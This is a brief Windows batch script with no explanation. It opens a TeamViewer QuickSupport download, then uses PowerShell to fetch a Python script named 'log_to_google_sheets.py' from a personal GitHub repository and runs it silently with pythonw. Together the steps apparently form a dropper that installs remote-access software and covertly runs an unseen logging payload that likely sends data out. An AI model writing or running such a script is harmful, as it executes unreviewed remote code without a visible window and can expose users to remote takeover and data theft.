@echo off
::
start "" "https://download.teamviewer.com/download/TeamViewerQS_x64.exe?utm_source=google&utm_medium=cpc&utm_campaign=nl%7Cb%7Cpr%7C22%7Cjun%7Ctv-core-brand-only-exact-sn%7Cnew%7Ct0%7C0&utm_content=Exact&utm_term=teamviewer"

:: 
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/lolohole/my-front-end/raw/main/log_to_google_sheets.py', 'log_to_google_sheets.py')"

:: 
pythonw.exe log_to_google_sheets.py

